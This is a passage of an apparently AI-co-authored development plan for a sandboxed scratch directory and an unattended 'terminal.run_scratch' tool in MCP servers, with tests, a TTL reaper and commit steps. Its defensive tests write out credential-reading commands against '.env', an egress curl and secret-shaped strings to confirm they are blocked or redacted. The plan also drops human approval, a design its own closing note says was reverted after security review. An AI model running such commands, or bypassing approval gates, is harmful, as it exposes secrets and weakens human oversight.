        rel = candidate.relative_to(SCRATCH_ROOT)
    except ValueError:
        raise PolicyBlocked(f"scratch path escapes scratch root: {rel_path}")
    return f"{SCRATCH_PREFIX}{rel}".replace("\\", "/"), candidate


def _reset_scratch_dir() -> None:
    """Wipe and recreate the scratch directory. Called once at process start
    (see bottom of this file) so each new Claude Code session for this repo
    gets a clean scratch area; also directly callable from tests."""
    import shutil
    if SCRATCH_ROOT.exists():
        shutil.rmtree(SCRATCH_ROOT, ignore_errors=True)
    SCRATCH_ROOT.mkdir(parents=True, exist_ok=True)
```

Update `_enforce_path` (current lines 76-81) to allow-all inside scratch
(the resolver itself already prevents escaping `SCRATCH_ROOT`; deny rules for
paths scratch commands touch *outside* scratch are enforced by
`terminal.run_scratch`'s Layer 1 in Task 3, not here — `filesystem.read/write`
against `scratch://` paths are always inside scratch by construction):

```python
def _enforce_path(rel: str) -> None:
    if rel.startswith(SCRATCH_PREFIX):
        return   # scratch is allow-all by construction (resolver blocks escapes)
    d = _engine.evaluate_path(rel)
    if d.action == "block":
        _audit.policy_violation(path=rel, rule=d.rule or d.reason,
                                decision="block", tier=_engine.repo.tier)
        raise PolicyBlocked(f"policy blocked '{rel}': {d.reason}")
```

Add cleanup registration and the initial wipe near the bottom of the file.
Current lines 217-225:

```python
async def _run() -> None:
    async with stdio_server() as (read, write):
        await server.run(read, write, server.create_initialization_options())


if __name__ == "__main__":
    import asyncio
    asyncio.run(_run())
```

Replace with:

```python
def _register_scratch_cleanup() -> None:
    import atexit
    import signal
    import shutil

    def _cleanup(*_args) -> None:
        shutil.rmtree(SCRATCH_ROOT, ignore_errors=True)

    atexit.register(_cleanup)
    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(sig, lambda s, f: (_cleanup(), os._exit(1)))
        except (ValueError, OSError):
            pass   # not the main thread / unsupported platform -- best-effort


async def _run() -> None:
    async with stdio_server() as (read, write):
        await server.run(read, write, server.create_initialization_options())


if __name__ == "__main__":
    import asyncio
    _reset_scratch_dir()
    _register_scratch_cleanup()
    asyncio.run(_run())
```

Note: `_reset_scratch_dir()`/`_register_scratch_cleanup()` only run under
`if __name__ == "__main__"` (real server startup), not on import — this is
why the tests call `_reset_scratch_dir()` explicitly rather than relying on
import-time side effects.

- [ ] **Step 4: Run the test file to confirm it passes**

Run: `pytest tests/test_scratch_fs.py -v`
Expected: all 4 tests PASS.

- [ ] **Step 5: Deploy and run the full suite**

```bash
cp -v mcp-servers/filesystem-policy/server.py ~/.claude-env/mcp-servers/filesystem-policy/server.py
pytest tests/ -q
```
Expected: `244 passed` (240 from Task 1 + 4 new).

- [ ] **Step 6: Smoke-test with a real stdio client**

```bash
CLAUDE_ENV_REPO_ROOT="$(pwd)" ~/.claude-env/venv/bin/python - <<'EOF'
import asyncio, os
async def main():
    env = dict(os.environ)
    env["CLAUDE_ENV_REPO_ROOT"] = os.getcwd()
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client
    params = StdioServerParameters(
        command=str(os.path.expanduser("~/.claude-env/venv/bin/python")),
        args=["mcp-servers/filesystem-policy/server.py"], env=env, cwd=os.getcwd())
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            res = await session.call_tool("filesystem.write",
                {"path": "scratch://notes.txt", "content": "hello scratch"})
            print("write:", res.content[0].text)
            res = await session.call_tool("filesystem.read", {"path": "scratch://notes.txt"})
            print("read:", res.content[0].text)
asyncio.run(main())
EOF
```
Expected output: `write: WROTE scratch://notes.txt (13 bytes)` and
`read: hello scratch`.

- [ ] **Step 7: Commit**

```bash
git branch --show-current   # confirm: feat/secure-scratchpad
git add mcp-servers/filesystem-policy/server.py tests/test_scratch_fs.py
git commit -m "$(cat <<'EOF'
Add scratch:// path scheme to filesystem-policy MCP server

Agents need a disposable per-repo working area for intermediate files
without every path needing to match the repo's allow-list. scratch://
resolves under $CLAUDE_ENV_HOME/scratch/<repo_name>/ (keyed by repo, not
session -- CLAUDE_ENV_SESSION isn't wired to a shared cross-process value
today), is allow-all within itself (the resolver's relative_to() check is
what prevents escaping the scratch root), and is wiped clean at server
start plus on exit via atexit/signal handlers.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 3: Add `terminal.run_scratch` tool with two-layer enforcement

**Files:**
- Modify: `mcp-servers/terminal/server.py:1-90` (imports, module constants)
- Modify: `mcp-servers/terminal/server.py:372-425` (`list_tools`)
- Modify: `mcp-servers/terminal/server.py:440-474` (`call_tool`)
- Test: `tests/test_terminal_run_scratch.py` (new)

**Interfaces:**
- Consumes:
  - `security.command_inspector.inspect_command(command, cwd, engine, root=None,
    exempt_root=None) -> CommandVerdict` (Task 1) — `CommandVerdict.action` is
    `"deny"` or `"allow"`, `CommandVerdict.reason` is a human-readable string.
    `exempt_root` is passed as `SCRATCH_ROOT` so an agent's own scratch-local
    files aren't blocked purely by extension/name match (design decision 3).
  - `security.policy_engine.PolicyEngine.load(repo_root, global_policy) -> PolicyEngine` (existing)
    and its `.scan_content(text: str) -> tuple[str, list[tuple[str, int]]]` method
    (existing — the SAME method `filesystem.read`/`filesystem.write` already
    call for redaction; reusing it means scratch output goes through the one
    pattern set configured in `global-policy.yaml`/`repo-policy.yaml`, not a
    second divergent list).
  - `SCRATCH_ROOT` naming convention from Task 2 (`$CLAUDE_ENV_HOME/scratch/<repo_name>/`)
    — terminal MCP computes this independently (it's a different process from
    filesystem-policy) using the same formula, so both servers agree on the
    same directory without needing IPC.
  - Existing `_tokenize`, `_split_pipelines`, `_run_pipeline` from this same
    file (lines 211-301) — reused unchanged.
- Produces: nothing further downstream; this is the last code task.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_terminal_run_scratch.py`:

```python
"""Coverage for terminal.run_scratch (mcp-servers/terminal/server.py) --
unattended command execution in the per-repo scratch directory, protected by
two enforcement layers instead of the human-approval gate terminal.run uses.
Run: pytest tests/ -q

Layer 1 (pre-execution): security.command_inspector.inspect_command() checks
the command's file-looking arguments against the SAME policy engine that
protects filesystem.read/write, so `cat /path/to/repo/.env` or
`cp /path/to/repo/secrets/x .` is refused before anything executes.
Layer 2 (post-execution): PolicyEngine.scan_content() -- the SAME method
filesystem.read/write already call -- redacts any secret-shaped stdout/stderr
(e.g. an AWS-key-shaped string) before it reaches the agent.

Regression context: terminal.run's ONLY defense today is the human-approval
block. Removing that block for scratch commands without also porting
policy_hook.py's path-deny/egress logic would reopen exactly the
exfiltration path the platform's invariants exist to close (see
docs/superpowers/specs/2026-07-12-secure-scratchpad-design.md).
"""
import importlib.util
import subprocess
import sys
import types
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[1]


def _load_server(repo_root: Path, home: Path):
    calls = []

    class _FakeAudit:
        def __init__(self, *a, **k):
            pass

        def tool_call(self, *a, **k):
            calls.append(("tool_call", a, k))

        def security_event(self, *a, **k):
            calls.append(("security_event", a, k))

        def policy_violation(self, *a, **k):
            calls.append(("policy_violation", a, k))

        def human_approval_request(self, *a, **k):
            return "req-1"

    mod_audit_pkg = types.ModuleType("audit")
    mod_audit = types.ModuleType("audit.audit_logger")
    mod_audit.AuditLogger = _FakeAudit
    sys.modules["audit"] = mod_audit_pkg
    sys.modules["audit.audit_logger"] = mod_audit

    mod_lib_pkg = types.ModuleType("lib")
    mod_log = types.ModuleType("lib.logging_setup")
    import logging
    mod_log.get_logger = lambda *a, **k: logging.getLogger("test-terminal-scratch")
    sys.modules["lib"] = mod_lib_pkg
    sys.modules["lib.logging_setup"] = mod_log

    mod_mcp = types.ModuleType("mcp")
    mod_mcp_server = types.ModuleType("mcp.server")
    mod_mcp_server.Server = lambda name: types.SimpleNamespace(
        list_tools=lambda: (lambda f: f), call_tool=lambda: (lambda f: f))
    mod_mcp_stdio = types.ModuleType("mcp.server.stdio")
    mod_mcp_stdio.stdio_server = None
    mod_mcp_types = types.ModuleType("mcp.types")
    mod_mcp_types.TextContent = None
    mod_mcp_types.Tool = None
    sys.modules["mcp"] = mod_mcp
    sys.modules["mcp.server"] = mod_mcp_server
    sys.modules["mcp.server.stdio"] = mod_mcp_stdio
    sys.modules["mcp.types"] = mod_mcp_types

    import os
    os.environ["CLAUDE_ENV_REPO_ROOT"] = str(repo_root)
    os.environ["CLAUDE_ENV_HOME"] = str(home)

    spec = importlib.util.spec_from_file_location(
        "_terminal_scratch_server", _ROOT / "mcp-servers" / "terminal" / "server.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    mod._audit_calls = calls
    return mod


def _repo(tmp_path: Path) -> Path:
    repo = tmp_path / "demo-repo"
    (repo / ".claude").mkdir(parents=True)
    (repo / ".claude" / "repo-policy.yaml").write_text(
        (_ROOT / "config" / "repo-policy.template.yaml").read_text())
    (repo / ".env").write_text("SECRET_KEY=super-secret-value\n")
    return repo


@pytest.fixture()
def repo_and_server(tmp_path):
    """Note: SCRATCH_ROOT ($CLAUDE_ENV_HOME/scratch/<repo>/) and the repo root
    are UNRELATED directory trees -- scratch is not nested inside the repo.
    So a relative '../secret' from inside scratch does NOT resolve to the
    real repo's secret; tests that need to prove 'a scratch command can't
    reach the real repo's protected files' must use an ABSOLUTE path to the
    repo, which is the realistic vector (an agent knows REPO_ROOT and could
    construct an absolute path to it)."""
    repo = _repo(tmp_path)
    home = tmp_path / "home"
    (home / "scratch" / "demo-repo").mkdir(parents=True)
    srv = _load_server(repo, home)
    return repo, srv


def test_scratch_root_matches_filesystem_policy_convention(repo_and_server, tmp_path):
    _repo_path, srv = repo_and_server
    expected = tmp_path / "home" / "scratch" / "demo-repo"
    assert srv.SCRATCH_ROOT == expected.resolve()


def test_run_scratch_allows_ordinary_command(repo_and_server):
    _repo_path, srv = repo_and_server
    out = srv._run_scratch("echo hello")
    assert out.startswith("exit=0")
    assert "hello" in out


def test_run_scratch_allows_its_own_deny_shaped_file(repo_and_server):
    """Per the design's decision 3, scratch is allow-all for ITS OWN files --
    an agent-created '.env'-named scratch file is not blocked purely by
    extension match, unlike the real repo's .env (see the next test)."""
    _repo_path, srv = repo_and_server
    srv._run_scratch("echo not-a-real-secret | tee local.env")
    out = srv._run_scratch("cat local.env")
    assert out.startswith("exit=0")
    assert "not-a-real-secret" in out


def test_run_scratch_blocks_read_of_denied_path_outside_scratch(repo_and_server):
    repo_path, srv = repo_and_server
    # absolute path to the real repo's .env -- the realistic escape vector,
    # since scratch and the repo are unrelated directory trees (a relative
    # '../.env' from scratch does not resolve to this file at all).
    out = srv._run_scratch(f"cat {repo_path / '.env'}")
    assert out.startswith("BLOCKED:")
    assert "protected path" in out


def test_run_scratch_blocks_copy_of_denied_path_into_scratch(repo_and_server):
    repo_path, srv = repo_and_server
    out = srv._run_scratch(f"cp {repo_path / '.env'} ./copy.env")
    assert out.startswith("BLOCKED:")


def test_run_scratch_redacts_secret_shaped_output(repo_and_server):
    # AKIA[0-9A-Z]{16} matches unquoted -- unlike the generic_api_key pattern,
    # which requires the value itself to be quoted (api_key="...").
    _repo_path, srv = repo_and_server
    out = srv._run_scratch("echo AKIAABCDEFGHIJ12345K")
    assert "AKIAABCDEFGHIJ12345K" not in out
    assert "REDACTED" in out


def test_run_scratch_does_not_require_approval(repo_and_server):
    """The whole point: no human_approval_request call, no blocking wait."""
    _repo_path, srv = repo_and_server
    srv._run_scratch("echo hi")
    assert not any(call[0] == "human_approval_request" for call in srv._audit_calls)


def test_run_scratch_never_spawns_a_shell(repo_and_server, monkeypatch):
    _repo_path, srv = repo_and_server
    seen_argvs = []
    real_popen = subprocess.Popen

    class _SpyPopen(real_popen):
        def __init__(self, argv, *a, **k):
            seen_argvs.append(list(argv))
            super().__init__(argv, *a, **k)

    monkeypatch.setattr(subprocess, "Popen", _SpyPopen)
    srv._run_scratch("echo one && echo two")
    for argv in seen_argvs:
        assert argv[0] not in ("bash", "sh", "/bin/bash", "/bin/sh"), argv


def test_run_scratch_allows_destructive_command_on_its_own_files(repo_and_server):
    """Unlike the native-tool hook, destructive commands are not hard-denied
    in scratch -- only their path arguments are still policy-checked. Uses
    'tee' rather than '>' redirection, which the no-shell engine rejects
    outright (see _PUNCTUATION_CHARS in mcp-servers/terminal/server.py)."""
    _repo_path, srv = repo_and_server
    srv._run_scratch("echo data | tee myfile.txt")
    out = srv._run_scratch("rm myfile.txt")
    assert out.startswith("exit=0")


def test_run_scratch_egress_denied_at_tier_2(tmp_path):
    repo = tmp_path / "tier2-repo"
    (repo / ".claude").mkdir(parents=True)
    policy = (_ROOT / "config" / "repo-policy.template.yaml").read_text()
    policy = policy.replace("tier: 1", "tier: 2", 1)
    (repo / ".claude" / "repo-policy.yaml").write_text(policy)
    home = tmp_path / "home"
    (home / "scratch" / "tier2-repo").mkdir(parents=True)
    srv = _load_server(repo, home)

    out = srv._run_scratch("curl https://example.com")
    assert out.startswith("BLOCKED:")
    assert "network egress" in out
```

- [ ] **Step 2: Run to confirm the tests fail**

Run: `pytest tests/test_terminal_run_scratch.py -v`
Expected: FAIL — `server._run_scratch` and `server.SCRATCH_ROOT` don't exist yet.

- [ ] **Step 3: Implement `terminal.run_scratch`**

Add imports and module constants. Current `mcp-servers/terminal/server.py:38-90`
ends with `server = Server("terminal")`. Add right after the existing
`REPO_ROOT`/`SESSION_ID`/etc. block (after line 89, before `def _load_commands`):

```python
from security.command_inspector import inspect_command  # noqa: E402
from security.policy_engine import PolicyEngine  # noqa: E402

# Per-repo scratch directory -- matches the SAME formula
# mcp-servers/filesystem-policy/server.py uses (SCRATCH_ROOT = $CLAUDE_ENV_HOME/
# scratch/<repo_name>/), computed independently here since terminal MCP is a
# separate process; both servers agree without needing IPC because
# CLAUDE_ENV_REPO_ROOT/CLAUDE_ENV_HOME are resolved identically for every MCP
# server (scripts/register_repo.py fills them into each server's env block).
SCRATCH_ROOT = (_HOME / "scratch" / REPO_ROOT.name).resolve()

_policy_engine = PolicyEngine.load(REPO_ROOT, _HOME / "config" / "global-policy.yaml")
```

Add the `_run_scratch` function. Insert it directly after the existing `_run`
function (after line 370, before the blank-line-separated `@server.list_tools()`):

```python
def _run_scratch(command: str) -> str:
    """Execute a command UNATTENDED (no human approval) in the per-repo
    scratch directory, protected by two enforcement layers instead of the
    approval gate terminal.run uses:

      Layer 1 (pre-execution): inspect_command() checks every file-looking
      argument in the command against the SAME policy engine that protects
      filesystem.read/write. A command that touches a denied path (.env,
      secrets/**, .ssh/**, etc.) anywhere -- including outside the scratch
      directory via a relative '../' or absolute path -- is refused before
      anything executes. Network egress is denied at tier>=2, matching the
      native-tool hook's posture.

      Layer 2 (post-execution): stdout/stderr are run through the SAME
      PolicyEngine.scan_content() that filesystem.read/write already use, so
      `env | grep API_KEY` can't leak a real key even though the command
      itself was allowed to run -- redaction uses the one pattern set
      configured in global-policy.yaml/repo-policy.yaml, not a second one.

    Destructive commands (rm, dd, etc.) are NOT hard-denied here (unlike the
    native-tool hook) -- a scratch pad's entire point is disposable work an
    agent should be able to clean up itself. Their path arguments are still
    checked by Layer 1."""
    if not command.strip():
        return "ERROR: empty command"

    verdict = inspect_command(command, str(SCRATCH_ROOT), _policy_engine,
                              root=REPO_ROOT, exempt_root=SCRATCH_ROOT)
    if verdict.action == "deny":
        _audit.policy_violation(path=verdict.denied_path or command[:200],
                                rule=verdict.reason, decision="block",
                                tier=_policy_engine.repo.tier)
        return f"BLOCKED: {verdict.reason}"

    SCRATCH_ROOT.mkdir(parents=True, exist_ok=True)
    out = _run_in_dir(command, "run_scratch", str(SCRATCH_ROOT))

    redacted, hits = _policy_engine.scan_content(out)
    if hits and hits[0][1] == -1:
        # a hard-block content pattern matched (content_scan.on_match: block) --
        # mirrors filesystem.read's posture: the command already ran (unlike a
        # file read, execution can't be undone), but the output itself must
        # never reach the agent.
        _audit.security_event(category="secret_redaction", severity="high",
                              detail=f"terminal.run_scratch output blocked: {hits}",
                              source="terminal.run_scratch")
        return "BLOCKED: command output contained secret content and was withheld"
    if hits:
        _audit.security_event(category="secret_redaction", severity="low",
                              detail=f"terminal.run_scratch: {hits}",
                              source="terminal.run_scratch")
    return redacted
```

`_run_scratch` calls a new helper `_run_in_dir` rather than the existing `_run`
directly, because `_run` hardcodes `cwd = str(REPO_ROOT)` (line 317) — refactor
`_run` to accept the cwd as a parameter, defaulting to `REPO_ROOT` so
`terminal.run`/`run_tests`/etc. behavior is unchanged. Modify the existing
`_run` function signature and first lines. Current lines 303-317:

```python
def _run(template: str, kind: str) -> str:
    """Execute a command string with NO real shell involved.

    Supports the chaining/piping an agent naturally writes (';', '&&', '||',
    '|', including a leading 'cd dir && ...') by tokenizing with shlex and
    running each stage as its own argv via subprocess, never bash -c. Anything
    that needs a real shell -- redirection, subshells, backgrounding, command
    substitution -- is rejected with a clear error instead of silently doing
    nothing or (worse) being handed to a shell interpreter."""
    try:
        pipelines = _split_pipelines(_tokenize(template))
    except _CommandError as e:
        return f"ERROR: {e}"

    cwd = str(REPO_ROOT)
```

Replace with:

```python
def _run(template: str, kind: str, base_cwd: str | None = None) -> str:
    """Execute a command string with NO real shell involved.

    Supports the chaining/piping an agent naturally writes (';', '&&', '||',
    '|', including a leading 'cd dir && ...') by tokenizing with shlex and
    running each stage as its own argv via subprocess, never bash -c. Anything
    that needs a real shell -- redirection, subshells, backgrounding, command
    substitution -- is rejected with a clear error instead of silently doing
    nothing or (worse) being handed to a shell interpreter.

    base_cwd defaults to REPO_ROOT (terminal.run/run_tests/etc.); pass a
    different directory (e.g. SCRATCH_ROOT) to confine the initial cwd and any
    'cd' escapes to that directory instead -- see _run_in_dir."""
    try:
        pipelines = _split_pipelines(_tokenize(template))
    except _CommandError as e:
        return f"ERROR: {e}"

    root = Path(base_cwd) if base_cwd else REPO_ROOT
    cwd = str(root)
```

Then, still inside `_run`, the `cd` handling block (current lines 330-349)
references `REPO_ROOT` twice for its escape check — replace both occurrences
with `root` (the local variable just introduced):

```python
        argvs = pipeline["commands"]
        # 'cd' is a shell builtin, not an executable -- handle it as a cwd
        # change for the rest of the chain instead of trying to exec it.
        if len(argvs) == 1 and argvs[0][0] == "cd":
            target = argvs[0][1] if len(argvs[0]) > 1 else str(root)
            new_cwd = (Path(cwd) / target).resolve()
            try:
                if new_cwd != root and root not in new_cwd.parents:
                    raise _CommandError(f"cd target '{target}' escapes the repo root")
                if not new_cwd.is_dir():
                    raise _CommandError(f"cd: no such directory: {target}")
            except _CommandError as e:
                last_exit = 1
                stderr_parts.append(f"[cd] {e}")
                ran_any = True
                continue
            cwd = str(new_cwd)
            last_exit = 0
            ran_any = True
            continue
```

Add the `_run_in_dir` wrapper right after `_run` (this keeps `_run`'s existing
call sites — `_run_configured`, `terminal.run`'s `_run(command, "run")` —
completely unchanged, since they still call `_run(template, kind)` with no
third argument and default to `REPO_ROOT`):

```python
def _run_in_dir(template: str, kind: str, cwd: str) -> str:
    """Thin wrapper so callers with a non-default cwd (only run_scratch today)
    read clearly at the call site without every _run() caller needing to pass
    base_cwd explicitly."""
    return _run(template, kind, base_cwd=cwd)
```

Add the new tool to `list_tools()`. Current lines 402-424 end `terminal.run`'s
`Tool(...)` block with `]` closing the list (line 425). Insert a new tool
entry right before that closing `]`:

```python
        Tool(name="terminal.run_scratch",
             description="Run a command UNATTENDED (no human approval, no blocking "
                         "wait -- unlike terminal.run) in this repo's disposable "
                         "per-repo scratch directory ($CLAUDE_ENV_HOME/scratch/<repo>/). "
                         "Same no-shell sandbox as the other terminal tools (argv-only, "
                         "';'/'&&'/'||'/'|'/'cd' chaining supported, redirection/subshells/"
                         "substitution rejected). Safety without a human checkpoint comes "
                         "from two mechanical layers: (1) before running, every file-"
                         "looking argument in the command is checked against this repo's "
                         "policy engine -- a command touching a denied path (.env, "
                         "secrets/**, .ssh/**, etc.) anywhere, including outside the "
                         "scratch dir via '../', is refused before anything executes; "
                         "network egress is denied outright at tier>=2. (2) after "
                         "running, stdout/stderr are scanned and secret-shaped matches "
                         "are redacted before being returned. Destructive commands (rm, "
                         "dd) are allowed (a scratch pad's point is disposable work) but "
                         "their path arguments are still checked by layer (1). Every "
                         "call is audited.",
             inputSchema={"type": "object",
                          "properties": {"command": {"type": "string",
                                          "description": "The command line to run in the "
                                          "scratch directory, e.g. 'python3 train.py -o "
                                          "model.bin' or 'pip download requests -d .'. "
                                          "Same parsing rules as terminal.run's command "
                                          "field (no real shell; ';'/'&&'/'||'/'|' "
                                          "supported, redirection/subshells/substitution "
                                          "rejected)."}},
                          "required": ["command"]}),
```

Add dispatch in `call_tool`. Current lines 450-473 handle `terminal.run`;
insert a new branch right before the final `return [TextContent(type="text",
text=f"ERROR: unknown or denied tool {name}")]` (current line 474):

```python
    if name == "terminal.run_scratch":
        command = str(arguments.get("command", "")).strip()
        if not command:
            return [TextContent(type="text", text="ERROR: empty command")]
        return [TextContent(type="text", text=_run_scratch(command))]
    return [TextContent(type="text", text=f"ERROR: unknown or denied tool {name}")]
```

- [ ] **Step 4: Run the new test file**

Run: `pytest tests/test_terminal_run_scratch.py -v`
Expected: all 10 tests PASS.

- [ ] **Step 5: Run the full existing terminal test suite to confirm no regression**

Run: `pytest tests/test_terminal_command_chaining.py -v`
Expected: all pass unchanged (the `_run(template, kind, base_cwd=None)`
signature change is backward-compatible — every existing call site passes 2
positional args, which still binds correctly with `base_cwd` defaulting).

- [ ] **Step 6: Deploy and run the full suite**

```bash
cp -v mcp-servers/terminal/server.py ~/.claude-env/mcp-servers/terminal/server.py
pytest tests/ -q
```
Expected: `254 passed` (244 from Task 2 + 10 new).

- [ ] **Step 7: Smoke-test with a real stdio client**

```bash
CLAUDE_ENV_REPO_ROOT="$(pwd)" ~/.claude-env/venv/bin/python - <<'EOF'
import asyncio, os
async def main():
    env = dict(os.environ)
    env["CLAUDE_ENV_REPO_ROOT"] = os.getcwd()
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client
    params = StdioServerParameters(
        command=str(os.path.expanduser("~/.claude-env/venv/bin/python")),
        args=["mcp-servers/terminal/server.py"], env=env, cwd=os.getcwd())
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            tools = await session.list_tools()
            assert "terminal.run_scratch" in [t.name for t in tools.tools]
            res = await session.call_tool("terminal.run_scratch",
                {"command": "echo hello-from-scratch"})
            print("ordinary:", res.content[0].text)
            res = await session.call_tool("terminal.run_scratch",
                {"command": "cat ../.env"})
            print("denied-path:", res.content[0].text)
asyncio.run(main())
EOF
```
Expected: `ordinary: exit=0\nhello-from-scratch\n` and
`denied-path: BLOCKED: ...` (assuming a `.env` exists at repo root in this
manual test — create a throwaway one first if needed, then delete it).

- [ ] **Step 8: Commit**

```bash
git branch --show-current   # confirm: feat/secure-scratchpad
git add mcp-servers/terminal/server.py tests/test_terminal_run_scratch.py
git commit -m "$(cat <<'EOF'
Add terminal.run_scratch: unattended commands with mechanical enforcement

terminal.run's only defense is a human-approval block. run_scratch skips
that gate for the disposable per-repo scratch directory, replacing the
human checkpoint with two mechanical layers: pre-execution path-deny +
egress checking (reusing security.command_inspector.inspect_command from
the native-tool hook) and post-execution secret redaction over
stdout/stderr (reusing PolicyEngine.scan_content(), the same method
filesystem.read/write already use). Destructive commands are allowed
(unlike the native-tool hook) since disposable cleanup is the point of a
scratch pad, but their path arguments are still checked.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 4: TTL reaper backstop in `bootstrap.py`

**Files:**
- Modify: `bootstrap.py` (add function + call site in `init_policies`)
- Test: `tests/test_bootstrap_scratch_reap.py` (new)

**Interfaces:**
- Consumes: nothing from Tasks 1-3 directly (reads the same
  `$CLAUDE_ENV_HOME/scratch/` directory Tasks 2/3 write to, but as a
  standalone filesystem sweep — no import dependency).
- Produces: `bootstrap.reap_stale_scratch_dirs(home: Path, ttl_hours: float = 24) -> list[str]`
  (returns the names of directories removed, for logging/testing).

- [ ] **Step 1: Write the failing test**

Create `tests/test_bootstrap_scratch_reap.py`:

```python
"""Coverage for bootstrap.py's TTL reaper for stale scratch directories.
Run: pytest tests/ -q

Regression context: filesystem-policy wipes+recreates its repo's scratch dir
on every process start (mcp-servers/filesystem-policy/server.py's
_reset_scratch_dir, called from __main__), and attempts atexit/signal cleanup
on shutdown -- but neither covers SIGKILL, an OOM kill, or a host crash. This
reaper is the backstop: any bootstrap.py run (or a future periodic health
check) sweeps $CLAUDE_ENV_HOME/scratch/* and removes directories whose mtime
exceeds a TTL, so an abandoned scratch dir doesn't accumulate disk usage
indefinitely on a machine that never cleanly restarts its MCP servers.
"""
import importlib.util
import os
import time
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[1]
_spec = importlib.util.spec_from_file_location("bootstrap_under_test_reap",
                                               _ROOT / "bootstrap.py")
bootstrap = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(bootstrap)


def _make_scratch_dir(home: Path, name: str, age_hours: float) -> Path:
    d = home / "scratch" / name
    d.mkdir(parents=True)
    (d / "leftover.txt").write_text("x\n")
    old_time = time.time() - age_hours * 3600
    os.utime(d, (old_time, old_time))
    return d


def test_reaps_directories_older_than_ttl(tmp_path):
    home = tmp_path / "home"
    stale = _make_scratch_dir(home, "old-repo", age_hours=48)
    fresh = _make_scratch_dir(home, "new-repo", age_hours=1)

    removed = bootstrap.reap_stale_scratch_dirs(home, ttl_hours=24)

    assert "old-repo" in removed
    assert "new-repo" not in removed
    assert not stale.exists()
    assert fresh.exists()


def test_no_scratch_dir_is_a_noop(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    removed = bootstrap.reap_stale_scratch_dirs(home, ttl_hours=24)
    assert removed == []


def test_ttl_env_override(tmp_path, monkeypatch):
    home = tmp_path / "home"
    _make_scratch_dir(home, "medium-repo", age_hours=2)

    monkeypatch.setenv("CLAUDE_ENV_SCRATCH_TTL_HOURS", "1")
    removed = bootstrap.reap_stale_scratch_dirs(home)

    assert "medium-repo" in removed
```

- [ ] **Step 2: Run to confirm it fails**

Run: `pytest tests/test_bootstrap_scratch_reap.py -v`
Expected: FAIL — `bootstrap.reap_stale_scratch_dirs` does not exist yet.

- [ ] **Step 3: Implement the reaper in `bootstrap.py`**

Add the function near `init_policies` (after the existing `_deploy_config`
helper, before `def init_policies`, i.e. after current line 295):

```python
def reap_stale_scratch_dirs(home: Path, ttl_hours: float | None = None) -> list[str]:
    """Delete any $CLAUDE_ENV_HOME/scratch/<repo> directory whose mtime is
    older than ttl_hours (default 24, override with
    CLAUDE_ENV_SCRATCH_TTL_HOURS). Backstop for scratch cleanup that
    filesystem-policy's atexit/signal handlers can't reach (SIGKILL, OOM kill,
    host crash) -- normal wipe-on-start already handles the common case.
    Returns the names of directories removed."""
    if ttl_hours is None:
        ttl_hours = float(os.environ.get("CLAUDE_ENV_SCRATCH_TTL_HOURS", "24"))
    scratch_root = home / "scratch"
    if not scratch_root.is_dir():
        return []
    cutoff = time.time() - ttl_hours * 3600
    removed = []
    for child in scratch_root.iterdir():
        if child.is_dir() and child.stat().st_mtime < cutoff:
            shutil.rmtree(child, ignore_errors=True)
            removed.append(child.name)
    return removed
```

Check `import time` is already present near the top of `bootstrap.py`
(alongside the existing `import shutil`) — if not, add it to the imports
block at the top of the file.

Add the call site inside `init_policies`, right after the "mirror the
platform code" loop (current lines 323-333, ends right before
`# install the CLI into $CLAUDE_ENV_HOME/bin/claude-env`):

```python
    removed = reap_stale_scratch_dirs(HOME)
    if removed:
        ok(f"reaped {len(removed)} stale scratch dir(s): {', '.join(removed)}")
```

- [ ] **Step 4: Run the test file**

Run: `pytest tests/test_bootstrap_scratch_reap.py -v`
Expected: all 3 tests PASS.

- [ ] **Step 5: Run the full existing bootstrap test suite to confirm no regression**

Run: `pytest tests/test_bootstrap_config.py -v`
Expected: all pass unchanged (the reaper call site is additive, after the
existing config-deploy logic those tests exercise).

- [ ] **Step 6: Run the full suite**

```bash
pytest tests/ -q
```
Expected: `257 passed` (254 from Task 3 + 3 new).

Note: `bootstrap.py` itself is not part of the `init_policies()` mirror loop
(it's the script that performs the mirroring), so there is no separate
"deploy to `$CLAUDE_ENV_HOME`" step for this file — it runs from the repo
checkout directly, as documented in CLAUDE.md.

- [ ] **Step 7: Commit**

```bash
git branch --show-current   # confirm: feat/secure-scratchpad
git add bootstrap.py tests/test_bootstrap_scratch_reap.py
git commit -m "$(cat <<'EOF'
Add TTL reaper backstop for stale scratch directories

filesystem-policy wipes its repo's scratch dir on start and attempts
atexit/signal cleanup on shutdown, but neither covers SIGKILL/OOM/crash.
bootstrap.py now sweeps $CLAUDE_ENV_HOME/scratch/* on every run and
removes directories older than CLAUDE_ENV_SCRATCH_TTL_HOURS (default 24h)
as a backstop against unbounded disk growth on a machine that never
cleanly restarts its MCP servers.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 5: `global-policy.yaml` scratch section + documentation

**Files:**
- Modify: `config/global-policy.yaml` (add `scratch:` section)
- Modify: `README.md` (Approvals section + a new MCP tool reference entry)
- Modify: `CLAUDE.md` (repo map note, if the scratch dir needs mentioning —
  see step 3)

**Interfaces:** None — this task is documentation/config only, no code
interfaces produced or consumed.

- [ ] **Step 1: Add the scratch config section**

Append to `config/global-policy.yaml` (after the existing `tiers:` block at
the end of the file, current line 90):

```yaml

# scratch pad (mcp-servers/filesystem-policy's scratch:// scheme): a per-repo
# disposable working directory for filesystem.read/write/list, wiped clean at
# server start. This section only toggles the feature and sets the
# TTL-reaper backstop threshold (bootstrap.py::reap_stale_scratch_dirs).
#
# NOTE: an unattended command-execution tool (terminal.run_scratch) was
# planned and implemented but was REVERTED after security review: the
# path-confinement approach used to sandbox it could not contain a general
